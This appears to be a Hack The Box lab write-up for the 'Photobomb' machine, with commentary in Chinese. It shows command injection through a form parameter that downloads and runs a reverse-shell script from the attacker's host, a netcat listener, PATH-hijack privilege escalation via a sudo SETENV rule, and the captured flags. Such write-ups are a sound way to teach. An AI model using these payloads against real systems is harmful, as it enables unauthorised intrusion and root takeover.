###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Photobomb
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.228.60 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.228.60:22
Open 10.129.228.60:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwlzrcH3g6+RJ9JSdH4fFJPibAIpAZXAl7vCJA+98jmlaLCsANWQXth3UsQ+TCEf9YydmNXO2QAIocVR8y1NUEYBlN2xG4/7txjoXr9QShFwd10HNbULQyrGzPaFEN2O/7R90uP6lxQIDsoKJu2Ihs/4YFit79oSsCPMDPn8XS1fX/BRRhz1BDqKlLPdRIzvbkauo6QEhOiaOG1pxqOj50JVWO3XNpnzPxB01fo1GiaE4q5laGbktQagtqhz87SX7vWBwJXXKA/IennJIBPcyD1G6YUK0k6lDow+OUdXlmoxw+n370Knl6PYxyDwuDnvkPabPhkCnSvlgGKkjxvqks9axnQYxkieDqIgOmIrMheEqF6GXO5zz6WtN62UAIKAgxRPgIW0SjRw2sWBnT9GnLag74cmhpGaIoWunklT2c94J7t+kpLAcsES6+yFp9Wzbk1vsqThAss0BkVsyxzvL0U9HvcyyDKLGFlFPbsiFH7br/PuxGbqdO9Jbrrs9nx60=
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBrVE9flXamwUY+wiBc9IhaQJRE40YpDsbOGPxLWCKKjNAnSBYA9CPsdgZhoV8rtORq/4n+SO0T80x1wW3g19Ew=
|   256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEp8nHKD5peyVy3X3MsJCmH/HIUvJT+MONekDg5xYZ6D
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

先把網域加進來
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts 

10.129.228.60   photobomb.htb
```

查看網頁的source
```html
<!DOCTYPE html>
<html>
<head>
  <title>Photobomb</title>
  <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
  <script src="photobomb.js"></script>
</head>
<body>
  <div id="container">
    <header>
      <h1><a href="/">Photobomb</a></h1>
    </header>
    <article>
      <h2>Welcome to your new Photobomb franchise!</h2>
      <p>You will soon be making an amazing income selling premium photographic gifts.</p>
      <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
      <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
      <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
    </article>
  </div>
</body>
</html>
```

點`photobomb.js`有帳號`pH0t0`密碼`b0Mb!`
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

點`printer`之後前往`http://photobomb.htb/printer`，用burp卡住`DOWNLOAD PHOTO TO PRINT`
```
POST /printer HTTP/1.1

Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: keep-alive
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png&dimensions=600x400
```

對三個參數輸入`wget 10.10.14.70/test`看哪個會有反應，發現`filetype`的參數可行
```
photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png;wget+10.10.14.70/test&dimensions=

┌──(kali㉿kali)-[~/htb]
└─$ python3 -m http.server 80

10.129.228.60 - - [06/Sep/2024 02:59:32] "GET /test HTTP/1.1" 404 -
```

下載reverse之後執行後，得反彈shell，在`/home/wizard`可得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png;wget+10.10.14.70/reverse.sh&dimensions=600x400

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png;chmod+%2bx+reverse.sh&dimensions=600x400

photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=png;./reverse.sh&dimensions=600x400

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
wizard@photobomb:~$ cat user.txt
e2b1de529eb6499f1b0b105adb804104
```

查看`sudo -l`
```
wizard@photobomb:~/photobomb$ sudo -l
sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

查看`/opt/cleanup.sh`
```bash
wizard@photobomb:/opt$ cat cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

參考[hacktricks-SETENV](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv)跟[hacktricks-SUID binary with command path](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path)
可以針對`find`(沒有絕對路徑進行注入)
```
wizard@photobomb:/tmp$ echo bash > find
wizard@photobomb:/tmp$ chmod 777 find
wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.sh

root@photobomb:~# cat root.txt
187ebbc8ac1fc1d32ae699ce50d80a8f
```